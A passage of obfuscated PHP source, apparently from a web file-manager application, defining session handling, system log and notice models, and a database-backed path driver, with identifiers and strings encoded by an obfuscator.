$—Ëó‘ô => $ÎÂÛÛÖ) { array_set_value(self::$data, $—Ëó‘ô, $ÎÂÛÛÖ); } } else { array_set_value(self::$data, $òÔÑ¡”Õ, $ñ¸ÕäğÕ); } self::setBySign(self::$sessionSign, self::$data); } public static function get($¦Ûª•ö® = false) { self::init(); if (!$¦Ûª•ö®) { return self::$data; } return array_get_value(self::$data, $¦Ûª•ö®); } public static function remove($©¿­³¢) { self::init(); unset(self::$data[$©¿­³¢]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ĞÆÏ¡Îª][828])) { self::$handle->clearTimeout(); } } } goto f§Û±Ûµ‡; E¦ÆÎ¹ˆùÁ: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\155\x2e\x4c\x69\x67\x68\164\101\160\x70"; public $modelType = "\123\171\163\164\x65\x6d\117\x70\164\x69\x6f\156"; public $field = array("\156\141\x6d\145", "\147\x72\x6f\165\x70", "\144\145\x73\x63", "\143\157\x6e\164\x65\156\x74"); public function listData($á©×Šì¬ = false, $˜ƒâ°Œ = "\x6d\x6f\x64\151\x66\x79\124\151\x6d\145", $äòá‚€… = true) { return parent::listData($á©×Šì¬, $˜ƒâ°Œ, $äòá‚€…); } public function remove($¼¬è°½µ) { $èæ«Ü˜¬ = $this->findByName($¼¬è°½µ); if (!$èæ«Ü˜¬) { return !1; } return parent::remove($èæ«Ü˜¬[$_SERVER[ĞÆÏ¡Îª][407]]); } public function add($ãĞ·–é²) { if ($this->findByName($ãĞ·–é²[$_SERVER[ĞÆÏ¡Îª][32]])) { return !1; } return parent::insert($ãĞ·–é²); } public function update($Í˜©ƒ»­, $Òª¹«ğ†) { $ö’åÃ­Ì =& $_SERVER[ĞÆÏ¡Îª]; $”“Ìº¤ = $this->findByName($Í˜©ƒ»­); $Ù™ï¹ª­ = $this->findByName($Òª¹«ğ†[$ö’åÃ­Ì[32]]); if (!$”“Ìº¤ || $Ù™ï¹ª­ && $Ù™ï¹ª­[$ö’åÃ­Ì[407]] != $”“Ìº¤[$ö’åÃ­Ì[407]]) { return !1; } return parent::update($”“Ìº¤[$ö’åÃ­Ì[407]], $Òª¹«ğ†); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\171\x73\x74\145\x6d\137\x6c\157\147"; protected $dataAuto = array(array("\x63\162\145\x61\x74\x65\124\151\x6d\x65", "\x74\x69\155\x65", "\151\x6e\x73\145\162\x74", "\146\x75\156\x63\x74\x69\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ŸÜÎğÇì =& $_SERVER[ĞÆÏ¡Îª]; return array($ŸÜÎğÇì[2147] => LNG($ŸÜÎğÇì[2148]), $ŸÜÎğÇì[2149] => LNG($ŸÜÎğÇì[2150]), $ŸÜÎğÇì[1762] => LNG($ŸÜÎğÇì[2151]), $ŸÜÎğÇì[2152] => LNG($ŸÜÎğÇì[2153]), $ŸÜÎğÇì[2154] => LNG($ŸÜÎğÇì[2155]), $ŸÜÎğÇì[2156] => LNG($ŸÜÎğÇì[2157]), $ŸÜÎğÇì[2158] => LNG($ŸÜÎğÇì[2159]), $ŸÜÎğÇì[1792] => LNG($ŸÜÎğÇì[2159]), $ŸÜÎğÇì[1793] => LNG($ŸÜÎğÇì[2160]), $ŸÜÎğÇì[2161] => LNG($ŸÜÎğÇì[2162]), $ŸÜÎğÇì[2163] => LNG($ŸÜÎğÇì[2164]), $ŸÜÎğÇì[2165] => LNG($ŸÜÎğÇì[2166]), $ŸÜÎğÇì[2167] => LNG($ŸÜÎğÇì[2168]), $ŸÜÎğÇì[1790] => LNG($ŸÜÎğÇì[2169]), $ŸÜÎğÇì[2170] => LNG($ŸÜÎğÇì[2171]), $ŸÜÎğÇì[1797] => LNG($ŸÜÎğÇì[2172]), $ŸÜÎğÇì[2173] => LNG($ŸÜÎğÇì[2174]), $ŸÜÎğÇì[2175] => LNG($ŸÜÎğÇì[2176]), $ŸÜÎğÇì[2177] => LNG($ŸÜÎğÇì[2178]), $ŸÜÎğÇì[2179] => LNG($ŸÜÎğÇì[2180]), $ŸÜÎğÇì[1800] => LNG($ŸÜÎğÇì[2181]), $ŸÜÎğÇì[1801] => LNG($ŸÜÎğÇì[2182]), $ŸÜÎğÇì[2183] => LNG($ŸÜÎğÇì[2184]), $ŸÜÎğÇì[2185] => LNG($ŸÜÎğÇì[2186]), $ŸÜÎğÇì[2187] => LNG($ŸÜÎğÇì[2188]), $ŸÜÎğÇì[1795] => LNG($ŸÜÎğÇì[2189]), $ŸÜÎğÇì[2190] => LNG($ŸÜÎğÇì[2191]), $ŸÜÎğÇì[1794] => LNG($ŸÜÎğÇì[2192]), $ŸÜÎğÇì[2193] => LNG($ŸÜÎğÇì[2194]), $ŸÜÎğÇì[2195] => LNG($ŸÜÎğÇì[2196]), $ŸÜÎğÇì[2197] => LNG($ŸÜÎğÇì[2198]), $ŸÜÎğÇì[2199] => LNG($ŸÜÎğÇì[2199]), $ŸÜÎğÇì[2200] => LNG($ŸÜÎğÇì[1766]), $ŸÜÎğÇì[2201] => LNG($ŸÜÎğÇì[2202]), $ŸÜÎğÇì[2203] => LNG($ŸÜÎğÇì[2204]), $ŸÜÎğÇì[2205] => LNG($ŸÜÎğÇì[2206]), $ŸÜÎğÇì[2207] => LNG($ŸÜÎğÇì[2208]), $ŸÜÎğÇì[2209] => LNG($ŸÜÎğÇì[2210]), $ŸÜÎğÇì[2211] => LNG($ŸÜÎğÇì[2211]), $ŸÜÎğÇì[2212] => LNG($ŸÜÎğÇì[2213]), $ŸÜÎğÇì[2214] => LNG($ŸÜÎğÇì[2215]), $ŸÜÎğÇì[2216] => LNG($ŸÜÎğÇì[2217]), $ŸÜÎğÇì[2218] => LNG($ŸÜÎğÇì[2219]), $ŸÜÎğÇì[2220] => LNG($ŸÜÎğÇì[2221]), $ŸÜÎğÇì[2222] => LNG($ŸÜÎğÇì[2223])); } private function typeFile() { $¼ú†›âÃ =& $_SERVER[ĞÆÏ¡Îª]; $›Ó¬Òè‚ = array($¼ú†›âÃ[1797] => array($¼ú†›âÃ[1798]), $¼ú†›âÃ[2165] => array($¼ú†›âÃ[2224]), $¼ú†›âÃ[2167] => array($¼ú†›âÃ[2225]), $¼ú†›âÃ[1790] => array($¼ú†›âÃ[1791]), $¼ú†›âÃ[2175] => array(), $¼ú†›âÃ[2177] => array(), $¼ú†›âÃ[2179] => array(), $¼ú†›âÃ[1800] => array($¼ú†›âÃ[1802]), $¼ú†›âÃ[1801] => array($¼ú†›âÃ[1802]), $¼ú†›âÃ[2183] => array($¼ú†›âÃ[2226]), $¼ú†›âÃ[2185] => array($¼ú†›âÃ[2226]), $¼ú†›âÃ[2187] => array($¼ú†›âÃ[2227]), $¼ú†›âÃ[2173] => array($¼ú†›âÃ[2228]), $¼ú†›âÃ[1795] => array($¼ú†›âÃ[2229]), $¼ú†›âÃ[2190] => array($¼ú†›âÃ[2230]), $¼ú†›âÃ[1794] => array($¼ú†›âÃ[1796])); return $›Ó¬Òè‚; } private function typeAll() { $ú€¸¬²à =& $_SERVER[ĞÆÏ¡Îª]; $º¶›“üÉ = $this->typeList; $ä¾Ñú…Î = array_filter($this->typeFile()); foreach ($ä¾Ñú…Î as $æ«½É»« => $Ü—÷ãœ÷) { $º¶›“üÉ[$Ü—÷ãœ÷[0]] = $º¶›“üÉ[$æ«½É»«]; } $º¶›“üÉ[$ú€¸¬²à[1802]] = LNG($ú€¸¬²à[2231]); $º¶›“üÉ[$ú€¸¬²à[2226]] = LNG($ú€¸¬²à[2232]); return $º¶›“üÉ; } public function addLog($ˆÆ……’¼, $Â±ÀÍ¯š = array()) { $£Ê¦ë× =& $_SERVER[ĞÆÏ¡Îª]; if (!isset($this->typeList[$ˆÆ……’¼])) { return; } $ÂÔ³ÍË = defined($£Ê¦ë×[484]) && USER_ID ? USER_ID : (isset($Â±ÀÍ¯š[$£Ê¦ë×[1647]]) ? $Â±ÀÍ¯š[$£Ê¦ë×[1647]] : 0); if (!$ÂÔ³ÍË) { $ÂÔ³ÍË = (int) Session::get($£Ê¦ë×[1956]); } if ($ˆÆ……’¼ == $£Ê¦ë×[2201] && is_array($Â±ÀÍ¯š[$£Ê¦ë×[2233]]) && !$Â±ÀÍ¯š[$£Ê¦ë×[2233]]) { return; } $Ê¦«ƒ¨ = get_client_ip(); if (!$Â±ÀÍ¯š || strlen(json_encode($Â±ÀÍ¯š)) >= 1024) { $Â±ÀÍ¯š = array($£Ê¦ë×[2234] => $Ê¦«ƒ¨); } else { if (is_array($Â±ÀÍ¯š)) { $Â±ÀÍ¯š[$£Ê¦ë×[2234]] = $Ê¦«ƒ¨; } else { $Â±ÀÍ¯š = array($£Ê¦ë×[1184] => $Â±ÀÍ¯š, $£Ê¦ë×[2234] => $Ê¦«ƒ¨); } } $Â±ÀÍ¯š = array($£Ê¦ë×[1637] => Session::sign(), $£Ê¦ë×[1638] => $ÂÔ³ÍË, $£Ê¦ë×[33] => $ˆÆ……’¼, $£Ê¦ë×[1640] => json_encode($Â±ÀÍ¯š)); parent::add($Â±ÀÍ¯š); } public function remove($Ãœ¤÷¤) { $this->where(array($_SERVER[ĞÆÏ¡Îª][428] => $Ãœ¤÷¤))->delete(); } private function _makeOrder($†íú±¥¢ = '') { $ÂŞœ£êº =& $_SERVER[ĞÆÏ¡Îª]; $ùêÃÉ•È = $ÂŞœ£êº[200]; $‡âå¤ = array($ÂŞœ£êº[459] => $ÂŞœ£êº[460], $ÂŞœ£êº[461] => $ÂŞœ£êº[462]); $ÕúÒ›‰Õ = Input::get($ÂŞœ£êº[467], $ÂŞœ£êº[7], $ÂŞœ£êº[1988], array($ÂŞœ£êº[1910], $ÂŞœ£êº[461])); $ÕúÒ›‰Õ = $‡âå¤[$ÕúÒ›‰Õ]; $†íú±¥¢ = $†íú±¥¢ . "{$ùêÃÉ•È}\40{$ÕúÒ›‰Õ}"; return $this->order($†íú±¥¢); } public function get($è‰Ü´› = '') { $Éá¼¿ìÑ =& $_SERVER[ĞÆÏ¡Îª]; if (!$è‰Ü´›) { show_json(array()); } $¼·²Õ•¹ = array(); if ($è‰Ü´›[$Éá¼¿ìÑ[1647]]) { $¼·²Õ•¹[$Éá¼¿ìÑ[1647]] = $è‰Ü´›[$Éá¼¿ìÑ[1647]]; } if (isset($è‰Ü´›[$Éá¼¿ìÑ[756]])) { $Ü‘–³ú¤ = $è‰Ü´›[$Éá¼¿ìÑ[756]]; $¶³¿òêà = isset($è‰Ü´›[$Éá¼¿ìÑ[506]]) ? $è‰Ü´›[$Éá¼¿ìÑ[506]] : time(); $¼·²Õ•¹[$Éá¼¿ìÑ[200]] = array($Éá¼¿ìÑ[342], array($Ü‘–³ú¤, $¶³¿òêà)); } if ($è‰Ü´›[$Éá¼¿ìÑ[33]]) { $ñşòõêØ = explode($Éá¼¿ìÑ[50], $è‰Ü´›[$Éá¼¿ìÑ[33]]); $§¨‰Ïı = $this->typeFile(); $ºÃöº×ö = array(); foreach ($ñşòõêØ as $ã¬ş½äÀ) { $ºÃöº×ö[] = $ã¬ş½äÀ; if (isset($§¨‰Ïı[$ã¬ş½äÀ])) { $ºÃöº×ö = array_merge($ºÃöº×ö, $§¨‰Ïı[$ã¬ş½äÀ]); } } $ºÃöº×ö = array_unique($ºÃöº×ö); if ($ºÃöº×ö) { $¼·²Õ•¹[$Éá¼¿ìÑ[33]] = array($Éá¼¿ìÑ[7], $ºÃöº×ö); } } else { $¼·²Õ•¹[$Éá¼¿ìÑ[33]] = array($Éá¼¿ìÑ[2235], $Éá¼¿ìÑ[2236]); } if (!empty($è‰Ü´›[$Éá¼¿ìÑ[2234]])) { $¼·²Õ•¹[$Éá¼¿ìÑ[462]] = array($Éá¼¿ìÑ[391], "\x25{$è‰Ü´›[$Éá¼¿ìÑ[2234]]}\x25"); } $©á¾¥©™ = $this->_makeOrder()->where($¼·²Õ•¹)->selectPage(); if (empty($©á¾¥©™[$Éá¼¿ìÑ[378]])) { show_json(array(), !0, $©á¾¥©™[$Éá¼¿ìÑ[375]]); } $©á¾¥©™[$Éá¼¿ìÑ[378]] = $this->logList($©á¾¥©™[$Éá¼¿ìÑ[378]]); return $©á¾¥©™; } private function ipAddress(&$ùĞ›ÈÑÔ) { $ÙÀ‰åîÇ =& $_SERVER[ĞÆÏ¡Îª]; if (!empty($ùĞ›ÈÑÔ[$ÙÀ‰åîÇ[2234]])) { $ëÍ…Ò™ë = IpLocation::get($ùĞ›ÈÑÔ[$ÙÀ‰åîÇ[2234]]); } else { $ëÍ…Ò™ë = LNG($ÙÀ‰åîÇ[2237]); } $ùĞ›ÈÑÔ[$ÙÀ‰åîÇ[2238]] = $ëÍ…Ò™ë; } private function descZipDownload($¬ØøôØİ, &$³íâÈº) { $†è­ÄÂ =& $_SERVER[ĞÆÏ¡Îª]; if (!isset($¬ØøôØİ[$†è­ÄÂ[2239]])) { return; } $®Şä°…œ = json_decode($¬ØøôØİ[$†è­ÄÂ[2239]], !0); foreach ($®Şä°…œ as $ÉƒÆçµ…) { try { $ó—¥ˆ‰¦ = IO::infoFull($ÉƒÆçµ…[$†è­ÄÂ[84]]); } catch (Exception $àñ¡Şßú) { continue; } $¬ØøôØİ[$†è­ÄÂ[84]] = $ÉƒÆçµ…[$†è­ÄÂ[84]]; $³íâÈº[] = $¬ØøôØİ[$†è­ÄÂ[411]] = $ó—¥ˆ‰¦[$†è­ÄÂ[411]]; $³íâÈº[] = $¬ØøôØİ[$†è­ÄÂ[2042]] = $ó—¥ˆ‰¦[$†è­ÄÂ[441]]; break; } return $¬ØøôØİ; } private function getSourceList(&$àáø‡Ì) { $—•ÀÌÁ™ =& $_SERVER[ĞÆÏ¡Îª]; $£“Ğ…Š¡ = array(); foreach ($àáø‡Ì as $ûÇÑÒ¯Í => $Ò•Ä×¤) { $œŞÅ„¹ = json_decode($Ò•Ä×¤[$—•ÀÌÁ™[462]], !0); if ($Ò•Ä×¤[$—•ÀÌÁ™[33]] == $—•ÀÌÁ™[1793]) { $œŞÅ„¹ = $this->descZipDownload($œŞÅ„¹, $£“Ğ…Š¡); $àáø‡Ì[$ûÇÑÒ¯Í][$—•ÀÌÁ™[462]] = json_encode($œŞÅ„¹); continue; } if (strpos($Ò•Ä×¤[$—•ÀÌÁ™[33]], $—•ÀÌÁ™[2044]) !== 0) { if (!isset($œŞÅ„¹[$—•ÀÌÁ™[84]]) || strpos($Ò•Ä×¤[$—•ÀÌÁ™[33]], $—•ÀÌÁ™[2240]) !== 0) { continue; } try { $ß¢ÃáÆ½ = IO::infoFull($œŞÅ„¹[$—•ÀÌÁ™[84]]); } catch (Exception $Êú¡Ğ‚) { continue; } $£“Ğ…Š¡[] = $œŞÅ„¹[$—•ÀÌÁ™[411]] = $ß¢ÃáÆ½[$—•ÀÌÁ™[411]]; $£“Ğ…Š¡[] = $œŞÅ„¹[$—•ÀÌÁ™[2042]] = $ß¢ÃáÆ½[$—•ÀÌÁ™[441]]; $àáø‡Ì[$ûÇÑÒ¯Í][$—•ÀÌÁ™[462]] = json_encode($œŞÅ„¹); continue; } $£“Ğ…Š¡[] = $œŞÅ„¹[$—•ÀÌÁ™[411]]; $£“Ğ…Š¡[] = $œŞÅ„¹[$—•ÀÌÁ™[2042]]; if ($œŞÅ„¹[$—•ÀÌÁ™[33]] == $—•ÀÌÁ™[566]) { $£“Ğ…Š¡[] = $œŞÅ„¹[$—•ÀÌÁ™[462]][$—•ÀÌÁ™[1151]]; $£“Ğ…Š¡[] = $œŞÅ„¹[$—•ÀÌÁ™[462]][$—•ÀÌÁ™[1152]]; } if ($œŞÅ„¹[$—•ÀÌÁ™[33]] == $—•ÀÌÁ™[2052]) { $£“Ğ…Š¡[] = $œŞÅ„¹[$—•ÀÌÁ™[462]][$—•ÀÌÁ™[411]]; } } if (!$£“Ğ…Š¡) { return array(); } return Model($—•ÀÌÁ™[820])->sourceListInfo($£“Ğ…Š¡, !0); } private function logList($Ë¥Ôº¸) { $Š±êëµæ =& $_SERVER[ĞÆÏ¡Îª]; $Ôçç”‚ = array_to_keyvalue($Ë¥Ôº¸, $Š±êëµæ[12], $Š±êëµæ[1647]); $ò…áéÅæ = Model($Š±êëµæ[544])->userListInfo(array_unique($Ôçç”‚)); $ö¬ÄÙÕ¨ = $this->getSourceList($Ë¥Ôº¸); $¡í…ç© = $this->typeAll(); $Ïßùüñ = array(); $”‹Œ êô = array(); foreach ($Ë¥Ôº¸ as $ˆäª´ŸÁ => $ÉÍÄêÇ§) { $†ª’Å² = $ÉÍÄêÇ§[$Š±êëµæ[33]]; $€»¨ÔóĞ = isset($ò…áéÅæ[$ÉÍÄêÇ§[$Š±êëµæ[1647]]]) ? $ò…áéÅæ[$ÉÍÄêÇ§[$Š±êëµæ[1647]]] : !1; $ÄÂ€õŒ = strpos($†ª’Å², $Š±êëµæ[2241]) === 0 ? LNG($Š±êëµæ[2242]) : LNG($Š±êëµæ[2237]); $ÉÍÄêÇ§[$Š±êëµæ[32]] = isset($€»¨ÔóĞ[$Š±êëµæ[32]]) ? $€»¨ÔóĞ[$Š±êëµæ[32]] : LNG($Š±êëµæ[2237]); $ÉÍÄêÇ§[$Š±êëµæ[551]] = isset($€»¨ÔóĞ[$Š±êëµæ[551]]) ? $€»¨ÔóĞ[$Š±êëµæ[551]] : $Š±êëµæ[12]; $ÉÍÄêÇ§[$Š±êëµæ[1546]] = isset($¡í…ç©[$†ª’Å²]) ? $¡í…ç©[$†ª’Å²] : $ÄÂ€õŒ; $ÉÍÄêÇ§[$Š±êëµæ[1987]] = $€»¨ÔóĞ; $ã¾ÚÒ Ÿ = json_decode($ÉÍÄêÇ§[$Š±êëµæ[462]], !0); $ÉÍÄêÇ§[$Š±êëµæ[2234]] = isset($ã¾ÚÒ Ÿ[$Š±êëµæ[2234]]) ? $ã¾ÚÒ Ÿ[$Š±êëµæ[2234]] : $Š±êëµæ[12]; $ÉÍÄêÇ§[$Š±êëµæ[2238]] = IpLocation::get($ÉÍÄêÇ§[$Š±êëµæ[2234]]); if (strpos($†ª’Å², $Š±êëµæ[2044]) === 0 || isset($ã¾ÚÒ Ÿ[$Š±êëµæ[2042]])) { $ã¾ÚÒ Ÿ[$Š±êëµæ[86]] = $ö¬ÄÙÕ¨[$ã¾ÚÒ Ÿ[$Š±êëµæ[411]]]; $ã¾ÚÒ Ÿ[$Š±êëµæ[2057]] = $ö¬ÄÙÕ¨[$ã¾ÚÒ Ÿ[$Š±êëµæ[2042]]]; if ($ã¾ÚÒ Ÿ[$Š±êëµæ[33]] == $Š±êëµæ[566]) { $ã¾ÚÒ Ÿ[$Š±êëµæ[462]][$Š±êëµæ[1151]] = $ö¬ÄÙÕ¨[$ã¾ÚÒ Ÿ[$Š±êëµæ[462]][$Š±êëµæ[1151]]]; $ã¾ÚÒ Ÿ[$Š±êëµæ[462]][$Š±êëµæ[1152]] = $ö¬ÄÙÕ¨[$ã¾ÚÒ Ÿ[$Š±êëµæ[462]][$Š±êëµæ[1152]]]; } if ($ã¾ÚÒ Ÿ[$Š±êëµæ[33]] == $Š±êëµæ[2052]) { $ã¾ÚÒ Ÿ[$Š±êëµæ[462]][$Š±êëµæ[411]] = $ö¬ÄÙÕ¨[$ã¾ÚÒ Ÿ[$Š±êëµæ[462]][$Š±êëµæ[411]]]; } if ($ã¾ÚÒ Ÿ[$Š±êëµæ[33]] == $Š±êëµæ[1788]) { $ã¾ÚÒ Ÿ[$Š±êëµæ[2057]] = $ã¾ÚÒ Ÿ[$Š±êëµæ[86]]; $ã¾ÚÒ Ÿ[$Š±êëµæ[2042]] = $ã¾ÚÒ Ÿ[$Š±êëµæ[2057]][$Š±êëµæ[411]]; $ã¾ÚÒ Ÿ[$Š±êëµæ[86]] = !1; $ã¾ÚÒ Ÿ[$Š±êëµæ[411]] = $Š±êëµæ[12]; } if ($ã¾ÚÒ Ÿ[$Š±êëµæ[86]] && $ã¾ÚÒ Ÿ[$Š±êëµæ[86]][$Š±êëµæ[420]] == $Š±êëµæ[1267]) { $”‹Œ êô[] = $ÉÍÄêÇ§[$Š±êëµæ[407]]; unset($Ë¥Ôº¸[$ˆäª´ŸÁ]); continue; } if ($ã¾ÚÒ Ÿ[$Š±êëµæ[2057]] && $ã¾ÚÒ Ÿ[$Š±êëµæ[2057]][$Š±êëµæ[420]] == $Š±êëµæ[1267]) { $”‹Œ êô[] = $ÉÍÄêÇ§[$Š±êëµæ[407]]; unset($Ë¥Ôº¸[$ˆäª´ŸÁ]); continue; } } $ÉÍÄêÇ§[$Š±êëµæ[462]] = $ã¾ÚÒ Ÿ; unset($ÉÍÄêÇ§[$Š±êëµæ[2243]]); $Ïßùüñ[] = $ÉÍÄêÇ§; } $this->clearSystemPathLog($”‹Œ êô); return $Ïßùüñ; } private function clearSystemPathLog($ùÊÃß§±) { $ªñ­ä¸í =& $_SERVER[ĞÆÏ¡Îª]; if (count($ùÊÃß§±) == 0) { return; } $ë“ãİ‰§ = array($ªñ­ä¸í[407] => array($ªñ­ä¸í[7], array_unique($ùÊÃß§±))); $this->where($ë“ãİ‰§)->delete(); } public function deviceList($È¾ÁîİÜ, $ˆ¢¡—÷ = 0) { $½•ğğŒ =& $_SERVER[ĞÆÏ¡Îª]; $š–®”ˆ = array($½•ğğŒ[1647] => $È¾ÁîİÜ, $½•ğğŒ[200] => array($½•ğğŒ[1005], $ˆ¢¡—÷), $½•ğğŒ[33] => $½•ğğŒ[1762]); $èêæ¿ğ® = array(); $ô±•æÃê = $this->field($½•ğğŒ[2244])->where($š–®”ˆ)->order($½•ğğŒ[2055])->limit(50)->select(); foreach ($ô±•æÃê as $ü‘‡ëº‘ => $îœ„‚Ğ) { if ($ü‘‡ëº‘ > 0 && abs($îœ„‚Ğ[$½•ğğŒ[200]] - $ô±•æÃê[$ü‘‡ëº‘ - 1][$½•ğğŒ[200]]) < 5) { continue; } $ÌğË¯é¬ = json_decode($îœ„‚Ğ[$½•ğğŒ[462]], !0); $îœ„‚Ğ[$½•ğğŒ[2234]] = isset($ÌğË¯é¬[$½•ğğŒ[2234]]) ? $ÌğË¯é¬[$½•ğğŒ[2234]] : $½•ğğŒ[12]; unset($ÌğË¯é¬[$½•ğğŒ[2234]]); $…Ö±«æî = $this->deviceType($ÌğË¯é¬[$½•ğğŒ[2045]]); if (isset($èêæ¿ğ®[$…Ö±«æî])) { continue; } $îœ„‚Ğ[$½•ğğŒ[2238]] = IpLocation::get($îœ„‚Ğ[$½•ğğŒ[2234]]); $îœ„‚Ğ[$½•ğğŒ[462]] = $ÌğË¯é¬; $èêæ¿ğ®[$…Ö±«æî] = $îœ„‚Ğ; } return array_values($èêæ¿ğ®); } public function deviceType($îººõ‰) { return $îººõ‰; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\155\56\x6e\x6f\x74\151\143\145\114\151\163\164"; public $field = array("\x6e\x61\x6d\145", "\x63\157\156\164\145\x6e\164", "\x61\x75\x74\150", "\x6d\157\x64\145", "\164\151\155\x65", "\164\171\x70\x65", "\154\145\x76\145\x6c", "\x65\x6e\x61\x62\x6c\x65", "\x73\157\x72\x74"); public function listData($ÀÕì…Öµ = false, $áê…–«» = "\163\157\x72\164", $éü÷İÆŠ = false) { return parent::listData($ÀÕì…Öµ, $áê…–«», $éü÷İÆŠ); } public function add($Ø×˜¦®½) { $Ê›¢‚ú« =& $_SERVER[ĞÆÏ¡Îª]; $¯ÖÜ›‡ = time(); if ($Ø×˜¦®½[$Ê›¢‚ú«[16]] == $Ê›¢‚ú«[2245]) { $¯ÖÜ›‡ = strtotime($Ø×˜¦®½[$Ê›¢‚ú«[203]]); } $Ø×˜¦®½[$Ê›¢‚ú«[203]] = $¯ÖÜ›‡; return parent::insert($Ø×˜¦®½); } public function update($îÑÂ’½æ, $Ş±¶„œş) { $®Á¡ÈÉ =& $_SERVER[ĞÆÏ¡Îª]; $¬ÆåÑá = $this->listData($îÑÂ’½æ); if (!$¬ÆåÑá) { return !1; } $öœ€õõ¢ = time(); if ($Ş±¶„œş[$®Á¡ÈÉ[16]] == $®Á¡ÈÉ[2245]) { $öœ€õõ¢ = strtotime($Ş±¶„œş[$®Á¡ÈÉ[203]]); } $Ş±¶„œş[$®Á¡ÈÉ[203]] = $öœ€õõ¢; return parent::update($îÑÂ’½æ, $Ş±¶„œş); } public function remove($—å³ğ‚æ) { $ÜŞıí¬Û = $this->listData($—å³ğ‚æ); if (!$ÜŞıí¬Û || $ÜŞıí¬Û[$_SERVER[ĞÆÏ¡Îª][1267]]) { return !1; } return parent::remove($—å³ğ‚æ); } public function sort($¥£œÅŠ˜, $àØº¨æ—) { return parent::update($¥£œÅŠ˜, $àØº¨æ—); } public function enable($™»¿²ş¯, $ßï‡åù³) { return parent::update($™»¿²ş¯, array($_SERVER[ĞÆÏ¡Îª][2246] => $ßï‡åù³)); } private function initUserOption() { $çİïéïï =& $_SERVER[ĞÆÏ¡Îª]; $this->optionType = $çİïéïï[2247]; $this->modelType = $çİïéïï[2248]; $this->field = array($çİïéïï[2249], $çİïéïï[32], $çİïéïï[203], $çİïéïï[33], $çİïéïï[2250], $çİïéïï[745], $çİïéïï[195]); } public function userNoticeGet($ó™ãä£† = false) { $this->initUserOption(); return parent::listData($ó™ãä£†, $_SERVER[ĞÆÏ¡Îª][407], !0); } public function userNoticeAdd($—ç¬ƒ­Ò) { $ÈáÂ‹ =& $_SERVER[ĞÆÏ¡Îª]; $this->initUserOption(); $•‡¥ÃË± = $this->findByKey($ÈáÂ‹[2249], $—ç¬ƒ­Ò[$ÈáÂ‹[407]]); if ($•‡¥ÃË±) { return !0; } $ş……É = array($ÈáÂ‹[2249] => $—ç¬ƒ­Ò[$ÈáÂ‹[407]], $ÈáÂ‹[32] => $—ç¬ƒ­Ò[$ÈáÂ‹[32]], $ÈáÂ‹[203] => $—ç¬ƒ­Ò[$ÈáÂ‹[203]], $ÈáÂ‹[33] => isset($—ç¬ƒ­Ò[$ÈáÂ‹[33]]) ? $—ç¬ƒ­Ò[$ÈáÂ‹[33]] : 1, $ÈáÂ‹[2250] => isset($—ç¬ƒ­Ò[$ÈáÂ‹[2250]]) ? $—ç¬ƒ­Ò[$ÈáÂ‹[2250]] : 0, $ÈáÂ‹[745] => 0, $ÈáÂ‹[195] => 0); return parent::insert($ş……É); } public function userNoticeEdit($„îÜöç·, $­˜Ìş¨ğ) { $this->initUserOption(); return parent::update($„îÜöç·, $­˜Ìş¨ğ); } } goto AŸÌÙëß°ó; cÜ¶‡ì©‚¬: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($÷Ÿ§Ğã) { $this->pathParse = $÷Ÿ§Ğã; $this->model = Model($_SERVER[ĞÆÏ¡Îª][1318]); } public function getPath($´ÏÍ÷Û°) { return trim($´ÏÍ÷Û°, $_SERVER[ĞÆÏ¡Îª][8]); } public function pathFather($ªÅÒ‰¹) { $åıÃ­°Ñ = $this->parse($ªÅÒ‰¹); $åıÃ­°Ñ = $this->infoSimple($ªÅÒ‰¹); return $åıÃ­°Ñ ? $åıÃ­°Ñ[$_SERVER[ĞÆÏ¡Îª][441]] : !1; } public function pathThis($É¼œËµã) { $¨çÀ¸²™ = $this->infoSimple($É¼œËµã); return $¨çÀ¸²™ ? $¨çÀ¸²™[$_SERVER[ĞÆÏ¡Îª][32]] : !1; } public function getPathOuter($¹µû›¢‹) { if (!$¹µû›¢‹) { return $¹µû›¢‹; } $™·ÀñËø = $this->parse($¹µû›¢‹); return KodIO::make($™·ÀñËø[$_SERVER[ĞÆÏ¡Îª][407]]); } public function copyFolderFromIO($‰œé°Æ, $Ø³…‡…Š, $¼É˜‹Ê´, $–Ùû´², $÷î¶Şæ¡) { $Ê§°Àñ = $this->model->copyFolderFromIO($‰œé°Æ, $Ø³…‡…Š, $¼É˜‹Ê´, $–Ùû´², $÷î¶Şæ¡); return KodIO::make($Ê§°Àñ); } public function isParentOf($æ¸Íœ†â, $§¼ö¨Ûõ) { return $this->model->isParentOf($æ¸Íœ†â, $§¼ö¨Ûõ); } public function mkfile($€ÂÁÒ–, $„ÅØ†„ã = '', $¢ÆÁ—É‚ = REPEAT_RENAME) { $•†½èıİ =& $_SERVER[ĞÆÏ¡Îª]; $êÃµšœå = $this->parse($€ÂÁÒ–); $€ÂÁÒ– = $êÃµšœå[$•†½èıİ[407]]; for ($äÂõ»»¹ = 0; $äÂõ»»¹ < count($êÃµšœå[$•†½èıİ[1319]]); $äÂõ»»¹++) { $¯Æô÷³ş = $êÃµšœå[$•†½èıİ[1319]][$äÂõ»»¹]; if ($äÂõ»»¹ == count($êÃµšœå[$•†½èıİ[1319]]) - 1) { $€ÂÁÒ– = $this->model->mkfile($€ÂÁÒ–, $¯Æô÷³ş, $„ÅØ†„ã, $¢ÆÁ—É‚); break; } $€ÂÁÒ– = $this->model->mkdir($€ÂÁÒ–, $¯Æô÷³ş, REPEAT_SKIP); } return $this->getPathOuter($€ÂÁÒ–); } public function mkdir($¥ÖÏİå’, $œÇ”·Òş = REPEAT_SKIP) { $Ö÷ìÍ =& $_SERVER[ĞÆÏ¡Îª]; $äàïú¤ş = $this->parse($¥ÖÏİå’); $¥ÖÏİå’ = $äàïú¤ş[$Ö÷ìÍ[407]]; for ($˜ÌÏ°ê = 0; $˜ÌÏ°ê < count($äàïú¤ş[$Ö÷ìÍ[1319]]); $˜ÌÏ°ê++) { $Á™ÜõØÌ = 